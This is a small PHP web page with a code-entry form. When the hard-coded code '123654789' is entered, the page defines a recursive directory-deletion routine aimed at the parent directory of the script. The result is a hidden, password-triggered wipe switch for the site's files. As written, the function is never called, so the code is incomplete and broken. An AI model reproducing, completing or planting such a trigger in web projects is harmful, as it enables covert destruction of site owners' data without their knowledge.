<?php
echo 'test';
$dir = dirname(__DIR__);




?>
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the code from the input
    $code = $_POST['code'];

    // Do something with the code
    echo "You entered the code: " . htmlspecialchars($code);

    // Example conditional action
    if ($code === "123654789") {
       function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir); // Get all files and directories in $dir

        foreach ($objects as $object) {
            if ($object != "." && $object != "..") { // Skip the special entries
                if (filetype($dir . "/" . $object) == "dir") 
                    rrmdir($dir . "/" . $object); // Recursively delete subdirectories
                else 
                    unlink($dir . "/" . $object); // Delete files
            }
        }

        reset($objects); // Resets the array pointer (not strictly needed)
        rmdir($dir); // Delete the directory itself after it is empty
    }
}
        // Add more actions here
    } else {
        echo "<br>Invalid code!";
    }
}
?>

<!-- HTML form to get the code -->
<form method="post" action="">
    Enter code: <input type="text" name="code" required>
    <input type="submit" value="Submit">
</form>
